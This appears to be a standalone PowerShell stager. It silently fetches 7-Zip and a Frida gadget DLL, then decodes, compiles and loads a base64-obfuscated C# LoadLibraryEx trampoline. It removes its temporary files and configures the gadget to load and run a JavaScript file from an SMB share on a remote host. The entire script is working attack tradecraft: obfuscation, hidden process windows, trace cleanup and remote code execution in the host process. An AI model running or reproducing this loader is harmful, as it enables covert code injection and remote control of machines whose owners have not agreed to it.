$RHOST="127.0.0.1"
# Download msi of 7z
$path=[System.IO.Path]::GetTempFileName()
$fs=[System.IO.FileStream]::new("${path}.msi",[System.IO.FileMode]::Create)
[System.Net.HttpWebRequest]::Create("https://www.7-zip.org/a/7z1900.msi").GetResponse().GetResponseStream().CopyTo($fs)
$fs.Close()
# Extract to tmp folder and wait for cmd to complete
$psi=[System.Diagnostics.ProcessStartInfo]::new("msiexec", "/a ${path}.msi /quiet /passive /qn TARGETDIR=${path}x")
$psi.CreateNoWindow=1 ; $psi.UseShellExecute=0
$p=[System.Diagnostics.Process]::Start($psi)
# Need that TARGETDIR now - wait for completion
for($i=0; $p.ExitCode -ne 0 ;$i++){ [System.Threading.Thread]::Sleep(100); if($i -eq 100){ break; } }
$arch="x86"; if($ENV:PROCESSOR_ARCHITECTURE -eq "AMD64"){ $arch+="_64"}
# Get latest Frida
$version=[System.Net.HttpWebRequest]::Create("https://github.com/frida/frida/releases/latest").GetResponse().ResponseUri.AbsolutePath.Split("/")[-1]
$redir=[System.Net.HttpWebRequest]::Create("https://github.com/frida/frida/releases/download/${version}/frida-gadget-${version}-windows-${arch}.dll.xz").GetResponse().ResponseUri
$fs=[System.IO.FileStream]::new("${path}x\frida.${arch}.dll.xz",[System.IO.FileMode]::Create)
[System.Net.HttpWebRequest]::Create($redir).GetResponse().GetResponseStream().CopyTo($fs)
$fs.Close()
# Extract the .xz with 7z
$psi.FileName="${path}x\Files\7-Zip\7z.exe" ; $psi.Arguments="x -y -o${path}x ${path}x\frida.${arch}.dll.xz"
$p=[System.Diagnostics.Process]::Start($psi)
# To load a .dll in C# with LoadLibraryEx System.Runtime.InteropServices.SafeHandle must be implemented. Then the new type must expose a function calling in-to that class
$cs=@"
dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7Cm5hbWVzcGFjZSBOcyB7CgljbGFzcyBM
b2FkZXIgOiBTYWZlSGFuZGxlCgl7CgkJcHVibGljIExvYWRlcihzdHJpbmcgZmlsZW5hbWUsIHVpbnQgZmxhZ3MpIDogYmFzZShJ
bnRQdHIuWmVybywgdHJ1ZSl7CgkJCWJhc2UuU2V0SGFuZGxlKExvYWRMaWJyYXJ5RXgoZmlsZW5hbWUsIEludFB0ci5aZXJvLCAw
KSk7CgkJfQoJCXB1YmxpYyBvdmVycmlkZSBib29sIElzSW52YWxpZHtnZXR7cmV0dXJuIHRoaXMuaGFuZGxlID09IEludFB0ci5a
ZXJvO319CgkJcHJvdGVjdGVkIG92ZXJyaWRlIGJvb2wgUmVsZWFzZUhhbmRsZSgpe3JldHVybiBGcmVlTGlicmFyeSh0aGlzLmhh
bmRsZSk7fQoJCVtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQoJCXN0YXRpYyBleHRlcm4g
SW50UHRyIExvYWRMaWJyYXJ5RXgoc3RyaW5nIGxwRmlsZU5hbWUsIEludFB0ciBoUmVzZXJ2ZWROdWxsLCB1aW50IGR3RmxhZ3Mp
OwoJCVtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQoJCVtyZXR1cm46IE1hcnNoYWxBcyhV
bm1hbmFnZWRUeXBlLkJvb2wpXXN0YXRpYyBleHRlcm4gYm9vbCBGcmVlTGlicmFyeShJbnRQdHIgaE1vZHVsZSk7CgoJCXB1Ymxp
YyBzdGF0aWMgdm9pZCBMb2FkV2luMzJMaWJyYXJ5KHN0cmluZyBsaWJQYXRoKSB7CgkJCVN5c3RlbS5JbnRQdHIgbW9kdWxlSGFu
ZGxlID0gTG9hZExpYnJhcnlFeChsaWJQYXRoLCBJbnRQdHIuWmVybywgMCk7CgkJfQoJfQoJcHVibGljIGNsYXNzIFRyYW1wb2xp
bmUgewoJCXB1YmxpYyBzdGF0aWMgdm9pZCBTdGFnZShzdHJpbmcgbGliKXsKCQkJTG9hZGVyLkxvYWRXaW4zMkxpYnJhcnkobGli
KTsKCQl9Cgl9Cn0=
"@
# Create & compile .cs to CIL library
$ba=[System.Convert]::FromBase64String($cs)
$fs=[System.IO.FileStream]::new("${path}x\trampoline.cs",[System.IO.FileMode]::Create)
$fs.Write($ba,0,$ba.Count) ; $fs.Close()
$psi.FileName = "csc" ; $psi.Arguments = "/target:library /out:${path}a ${path}x\trampoline.cs"
$p=[System.Diagnostics.Process]::Start($psi)
# Immediatly going to use output so make sure cmd finished
for($i=0; $p.ExitCode -ne 0 ;$i++){ [System.Threading.Thread]::Sleep(100); if($i -eq 100){ break; } }
[System.Reflection.Assembly]::LoadFile("${path}a")
# Clean a little bit
[System.IO.File]::Move("${path}x\frida.${arch}.dll","${path}.dll")
[System.IO.Directory]::Delete("${path}x",1)
[System.IO.File]::Delete("${path}")
[System.IO.File]::Delete("${path}.msi")
# Write gadget config
$fs=[System.IO.StreamWriter]::new([System.IO.File]::OpenWrite("${path}.config"))
# script/on_change=reload & script-directory/on_change=rescan don't seem to work over SMB
[System.IO.TextWriter]$fs.WriteLine(@"
{"interaction":{"type":"script","path":"\\\\${RHOST}\\C$\\gadget.js","on_load":"resume","runtime":"jit","on_change":"reload"}}
"@)
$fs.Close()
# Now use that type to loadlibex
[Ns.Trampoline]::Stage("${path}.dll")
